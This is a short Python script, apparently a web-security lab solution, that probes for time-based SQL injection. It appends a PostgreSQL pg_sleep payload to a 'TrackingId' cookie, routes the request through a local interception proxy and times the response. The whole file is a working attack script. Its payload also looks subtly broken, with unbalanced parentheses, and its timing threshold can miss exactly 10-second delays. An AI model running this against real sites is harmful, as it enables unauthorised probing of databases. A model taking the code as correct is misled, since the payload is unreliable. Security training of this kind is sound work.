# check if the time based vulnerabilty exist or not in the cookies tracking ID field.

import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def time_based_vulnerable(url):
    payload = "' || SELECT pg_sleep(10))--"
    payload_url_encoded = urllib.parse.quote(payload)
    cookies = {
        "TrackingId" : "gWMlGxJEJ0ziEOAq" + payload_url_encoded,
        "session" : "AHIMWBrzeAp3mMvhnGn9xTXDcCTHdanO"
    }

    res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

    if int(res.elapsed.total_seconds()) > 10:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] invalid input")
        print("[-] input formate : %s <url>" %sys.argv[0])
        sys.exit(-1)
    
    if time_based_vulnerable(url):
        print("the app is vulnerable to time based SQLi")
    else:
        print("the app is not vulnerable to time based SQLi")